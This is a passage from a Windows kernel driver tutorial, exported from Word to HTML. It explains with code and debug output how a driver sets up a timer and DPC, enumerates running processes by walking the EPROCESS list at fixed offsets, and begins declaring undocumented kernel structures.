pid=%d tid=%d&quot;,nameptr,pid,tid);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
timeout;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gTimer
= ExAllocatePool (NonPagedPool,sizeof(KTIMER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gDPCP
= ExAllocatePool(NonPagedPool,sizeof(KDPC));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curproc
= PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 3*PAGE_SIZE; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
!strncmp(&quot;System&quot;, (PCHAR) curproc + i, strlen(&quot;System&quot;)))<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>offset
= i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeInitializeTimer
(gTimer);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeInitializeDpc
(gDPCP,abc,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeSetTimerEx
(gTimer,timeout,1000,gDPCP);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay
2<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>System
pid=8 tid=60<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WINWORD.EXE
pid=1440 tid=1444<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WINWORD.EXE
pid=1440 tid=1444<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
function ExAllocatePool is another malloc for the device driver. This function
is obsolete and gets converted by the compiler to ExAllocatePoolWithTag. This function
allocated memory of type specified in the first parameter which is an enum
POOL_TYPE. The value we have used is NonPagedPool which is a scarce resource
and should be rarely used. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
is memory that cannot be paged to disk. The bad part of the option we choose is
that we should ask for memory in chunks of PAGE_SIZE as the memory allocated is
a multiple of this. In our case as we have asked for very small amounts of
memory that will be lots of wastage. The second parameter is the size of memory
we want and in our case it is the size of two structures KTIMER and KDPC. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
function returns a pointer to the newly allocated memory. The tag name used is
kdD which is to be read backwards and gives us Ddk. We then want to print out
the name of every program and we need the offset from the start of the Eprocess
structure, like we did earlier. The KTIMER that we created earlier we want to
initialize it to a non signaled state. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
function KeInitializeTimer does just that for us. If we do not use this function,
we get the blue screen of death. In the same vein the KeInitializeDpc function
initializes the DPC structure for us. Here we specify the KDPC structure as the
first parameter and most important the function that should be called each time
the timer expires. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
our case we need the abc function to be called. The last parameter is any data
that we want passed to our function when it gets called. The actual timer will
be set by the function KeSetTimerEx. This is the function that sets the timer
to the signaled state which is another of saying call the timer. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Here
we pass the KDPC object that represents the abc function to be called as the
last parameter, the third parameter is a time in milliseconds which specify
when the timer should be called. The first is the timer object and the second a
LARGE_INTEGER which is nothing but a data type __int64. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
timeout is set to 0. When we see the output, we realize that every second the
abc function gets called. In the abc function we are displaying the process id
and thread id of the current running program in user space. We use the standard
functions PsGetCurrentProcessId and PsGetCurrentThreadId for this. We also
print the name of the current program by using the function PsGetCurrentProcess
to give us the Eprocess structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Looking
at the output you can now see that at times Microsoft Word or WinWord is active
at times System. For the momemt we are not using any of the parameters supplied
to us.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P51<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>extern
PEPROCESS * PsInitialSystemProcess;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PEPROCESS
p,p1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*entry, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (PEPROCESS)PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p1
= (PEPROCESS)*PsInitialSystemProcess;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 p=%x p1=%p&quot;,p,p1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>entry
= start = (LIST_ENTRY *)((long)p + 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
pid = *(long *)((long)entry -4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
%d %x&quot;,(long)entry + 348,pid,(long)entry-160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>entry
= entry-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(entry != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay
2 p=8202fb60 p1=8202FB60<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>System
8 8202fb60<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>smss.exe
156 81f2fae0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Some
time ago we displayed all processes by using the function PsGetCurrentProcess
which returned a EPROCESS pointer. We then told you that 160 bytes from the
start was the LIST_ENTRY structures and then the name of the running program
was 508 bytes from the start. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
first initialize two variables entry and list to LIST_ENTRY member Flink that is
stored 160 bytes form the start. We then enter a while loop where we change
entry and not start. We quit out whenever we start and entry become the same
again. We change entry to point to the next Flink and the pid is stored 4 bytes
form entry and name of the program 348 bytes in the opposite direction. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>As
this is a circular list at some time entry will have the same value as start.
The point is what if we did not have the function PsGetCurrentProcess.
Fortunately for us we have a variable PsInitialSystemProcess that is a pointer
to a EPROCESS pointer. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
do not give this variable a value as using extern tells the linker that it is
defined some where else. Using extern is not the same as using
__declspec(dllimport) which is for entities exported. The keyword extern means
that the variable is created somewhere else, we are only using it here.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
access the EPROCESS pointer by using the * and this is the same value that the
PsGetCurrentProcess function gives us. Thus you have a choice in which way you
want the EPROCESS structure of System.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P52<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>long DWORD;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>short WORD;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>char BYTE;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
QUOTA_BLOCK<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
DWORD Flags;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*004*/
DWORD ChargeCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*008*/
DWORD PeakPoolUsage [2]; // NonPagedPool, PagedPool<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
DWORD PoolUsage<span style="mso-spacerun: yes">     </span>[2]; //
NonPagedPool, PagedPool<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*018*/
DWORD PoolQuota<span style="mso-spacerun: yes">     </span>[2]; //
NonPagedPool, PagedPool<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*020*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
HARDWARE_PTE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
unsigned Valid<span style="mso-spacerun: yes">           </span>:<span
style="mso-spacerun: yes">  </span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned Write<span
style="mso-spacerun: yes">           </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes">   </span>unsigned Owner<span style="mso-spacerun: yes">          
</span>:<span style="mso-spacerun: yes">  </span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned WriteThrough<span
style="mso-spacerun: yes">    </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned CacheDisable<span
style="mso-spacerun: yes">    </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned Accessed<span
style="mso-spacerun: yes">        </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned Dirty<span
style="mso-spacerun: yes">           </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned LargePage<span
style="mso-spacerun: yes">       </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*001*/
unsigned Global<span style="mso-spacerun: yes">    </span><span
style="mso-spacerun: yes">      </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned CopyOnWrite<span
style="mso-spacerun: yes">     </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned Prototype<span
style="mso-spacerun: yes">       </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

